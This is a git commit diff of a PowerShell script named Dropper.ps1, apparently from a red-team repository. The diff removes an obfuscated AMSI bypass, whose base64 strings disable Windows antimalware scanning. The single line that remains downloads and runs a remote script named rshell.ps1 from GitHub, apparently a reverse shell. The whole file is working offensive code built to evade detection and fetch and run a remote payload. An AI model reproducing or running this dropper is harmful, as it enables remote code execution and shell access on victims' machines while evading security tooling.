f359b942fd6327d68a2da1e8c4c943022a63835e
Witalij Ruzhnikov <rujnikov2015@outlook.com>
2024-03-23 01:45:11 +0800

    upd

--- Dropper.ps1
+++ Dropper.ps1
@@ -1,2 +1,1 @@
-﻿[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true);
-iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/V1rucov/rteam-rshell/master/rshell.ps1');
+﻿iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/V1rucov/rteam-rshell/master/rshell.ps1');
